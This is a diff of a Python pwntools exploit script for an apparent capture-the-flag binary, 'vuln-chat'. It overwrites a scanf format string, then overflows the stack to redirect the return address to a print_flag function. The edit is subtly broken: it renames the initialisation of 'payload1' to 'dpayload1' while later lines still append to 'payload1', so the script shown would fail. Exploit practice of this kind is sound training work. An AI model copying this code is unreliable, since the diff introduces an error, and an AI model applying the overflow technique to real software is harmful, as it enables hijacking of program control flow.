@@ -7,8 +7,7 @@ target = process('./vuln-chat')
 print target.recvuntil("username: ")
 
 # Form the first payload to overwrite the scanf format string
-payload0 = ""
-payload0 += "0"*0x14 # Fill up space to format string
+payload0 = "0"*0x14 # Fill up space to format string
 payload0 += "%99s" # Overwrite it with "%99s"
 
 # Send the payload with a newline character
@@ -18,7 +17,7 @@ target.sendline(payload0)
 print target.recvuntil("I know I can trust you?")
 
 # From the second payload to overwrite the return address
-payload1 = ""
+dpayload1 = ""
 payload1 += "1"*0x31 # Filler space to return address
 payload1 += p32(0x804856b) # Address of the print_flag function
 
